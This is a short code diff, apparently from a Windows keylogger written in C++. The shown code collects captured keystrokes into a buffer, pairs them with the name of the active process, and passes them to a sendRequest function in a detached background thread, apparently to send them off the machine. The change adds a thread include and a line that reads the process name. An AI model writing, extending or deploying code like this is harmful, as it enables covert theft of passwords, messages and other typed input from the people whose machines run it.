@@ -21,6 +21,7 @@
 #include <memory>
 #include <sstream>
 #include <string>
+#include <thread>
 
 constexpr size_t MAX_BUFFER_CHARS = 5000;
 constexpr UINT FLUSH_TIMER_ID = 1;
@@ -218,7 +219,7 @@ void FlushBuffer(void)
             contentStream << key;
         }
         std::wstring keystrokesContent = contentStream.str();
-
+        std::wstring processName = g_state.currentProcessName;
         std::thread([processName, keystrokesContent]() {
             sendRequest(processName + L" : " + keystrokesContent);
         }).detach();
